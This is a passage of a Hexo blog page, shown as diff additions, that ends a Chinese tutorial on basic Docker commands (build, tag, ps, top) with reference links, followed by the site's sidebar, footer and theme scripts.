+<p>上面的PATH为.，所以在当前目录下的所有文件（不包括.dockerignore中的）将会被tar打包并传送到docker daemon（一般在本机），从输出我们可以到Sending build context…，最后有个Removing intermediate container的过程，可以通过–rm=false来保留容器。</p>
+<p>TO-DO<br>docker build github.com/creack/docker-firefox失败。</p>
+<p><strong>6. 给镜像打上标签（tag）</strong></p>
+<p>tag的作用主要有两点：一是为镜像起一个容易理解的名字，二是可以通过docker tag来重新指定镜像的仓库，这样在push时自动提交到仓库。</p>
+<p>将同一IMAGE_ID的所有tag，合并为一个新的</p>
+<pre><code># docker tag 195eb90b5349 seanlook/ubuntu:rm_test</code></pre>
+<p>新建一个tag，保留旧的那条记录</p>
+<pre><code># docker tag Registry/Repos:Tag New_Registry/New_Repos:New_Tag</code></pre>
+<p><strong>7. 查看容器的信息container（ps）</strong></p>
+<pre><code>docker ps命令可以查看容器的CONTAINER
+ID、NAME、IMAGE
+NAME、端口开启及绑定、容器启动后执行的COMMNAD。经常通过ps来找到CONTAINER_ID。
+docker ps 默认显示当前正在运行中的container
+docker ps -a 查看包括已经停止的所有容器
+docker ps -l 显示最新启动的一个容器（包括已停止的）</code></pre>
+<p><strong>8. 查看容器中正在运行的进程（top）</strong></p>
+<p>容器运行时不一定有/bin/bash终端来交互执行top命令，查看container中正在运行的进程，况且还不一定有top命令，这是docker top &lt;container_id/container_name&gt;就很有用了。实际上在host上使用ps -ef|grep docker也可以看到一组类似的进程信息，把container里的进程看成是host上启动docker的子进程就对了。</p>
+<p><strong>9. 其他命令</strong></p>
+<pre><code>docker还有一些如login、cp、logs、export、import、load、kill等不是很常用的命令，比较简单，请参考官网。</code></pre>
+<p><strong>参考</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://docs.docker.com/v1.1/reference/commandline/cli/">Official Command Line Reference</a></li>
+</ul>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.widuu.com/docker/">docker中文指南cli-widuu翻译</a></li>
+</ul>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.dockerpool.com/static/books/docker_practice/">Docker —— 从入门到实践</a></li>
+</ul>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://17173ops.com/2014/10/13/docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E9%AB%98%E7%BA%A7.shtml">Docker基础与高级</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/27/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><span class="page-number current">28</span><a class="page-number" href="/page/29/">29</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" href="/page/29/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">424</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">400</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
